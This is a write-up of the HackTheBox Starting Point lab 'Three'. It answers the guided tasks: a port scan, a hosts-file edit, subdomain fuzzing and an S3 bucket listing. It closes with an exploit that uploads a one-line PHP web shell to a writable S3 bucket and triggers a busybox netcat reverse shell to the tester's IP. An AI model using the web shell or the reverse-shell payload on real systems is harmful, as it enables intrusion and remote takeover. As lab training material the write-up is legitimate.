<h3> Starting Point HackTheBox </h3>

<h3> Machine name: Three  </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5a46f1d2-4fc7-4016-8806-53dc390637ee)

#### Task 1

- How many TCP ports are open? 

First Let's scan the target
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f557a092-18c1-43e1-93b8-3ae08d4e1cf5)

```
Answer: 2 
```

#### Task 2

- What is the domain of the email address provided in the "Contact" section of the website? 

Going over to the web page shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1862c530-cbbe-4c92-8859-67b02e424ac9)

Checking the *Contact* page shows this email address
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f64c39e0-6be7-4fa2-95f9-13f947ec6a2d)

We can see the domain name

```
Answer:  thetoppers.htb 
```

#### Task 3

-  In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 

For this we need to edit our */etc/hosts* file so that it can resolve the hostname to ip address
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1738b417-0776-41c9-bd29-128f50127420)

```
Answer: /etc/hosts
```

#### Task 4

-  Which sub-domain is discovered during further enumeration? 

Let us fuzz for subdomain using *ffuf*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/41e96849-3940-48b5-a58a-2dcef10209c5)

We see that the result shows that the *s3* sub domain is up 

So i'll add *s3.thetoppers.htb* to my */etc/hosts* file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b82fc630-ff49-4e64-a81c-771ab1e7d7d0)

```
Answer: s3.thetoppers.htb
```

#### Task 5

-  Which service is running on the discovered sub-domain? 

Since we see the sub domain name looks interesting i'll search it up on google
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/49593313-c24d-434b-b3ea-0ecad5988ac5)

From the result we can tell the answer is *Amazon S3*

```
Answer: Amazon S3
```

#### Task 6

-  Which command line utility can be used to interact with the service running on the discovered sub-domain? 

Searching google for this gives the answer
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aeb6d782-b0e8-4a9b-b51e-5b3f62821d59)

```
Answer: awscli
```

#### Task 7

-  Which command is used to set up the AWS CLI installation? 

I installed aws tool from [here](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)

So to set up aws we use *aws configure*

```
Answer: aws configure
```

#### Task 8

-  What is the command used by the above utility to list all of the S3 buckets? 

To list all of the S3 bucket we use:

```
Answer: aws s3 ls 
```

But doing that on the target shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a54c9cc6-889f-4e01-94b5-c5949b078d7e)

It is trying to access the main amazon aws endpoint

But we just need to reference it to the endpoint already give to us

So I did this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8538bce0-8639-4995-98b1-d70a61f9494d)

Cool we see the index.php & .htaccess file

#### Task 9

-  This server is configured to run files written in what web scripting language? 

Back to the web app 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9cadf238-ba5f-4053-aeb0-d301a22a451a)

Using *wappalyzer* shows the language of the web server
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/65f37845-2d21-4be1-8454-1bc5e5e1c944)

```
Answer: PHP
```

#### Task 10

- Submit the root flag

Since we know the aws allows write access we can put files to the aws

But let us first download the index.php file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f9f6bbe-7c7f-449e-8597-7830753699d1)

Opening it shows it is the web root directory of the web server on port 80
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/71abc268-f1d7-4a7f-997a-bdea7cb5678e)

Cool. So this means we can upload our own file to the server

I created a file with this content names *shell.php*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bf93190-efbe-4438-9498-6f0832c036cf)

```php
<?php system($_GET['cmd']); ?>
```

Now i uploaded it to the aws
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2c6aeb84-094f-4459-86df-76b02ca1f926)

```
aws s3 --endpoint http://s3.thetoppers.htb cp shell.php s3://thetoppers.htb/
```

Our shell is uploaded we can now access it from the web server
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/160695da-44ce-4075-b9a4-a9b232a2737b)

We are user *www-data* let's get a reverse shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/efaacc43-3347-4c0b-9e5e-77209a9cc50c)

```
Payload: http://thetoppers.htb/shell.php?cmd=busybox%20nc%2010.10.14.27%201337%20-e%20/bin/bash
```

The flag is there :)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6d8b5859-4869-4bef-b640-33204ac41102)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/02f1f4a3-c853-4895-98f2-cdaccb64d883)
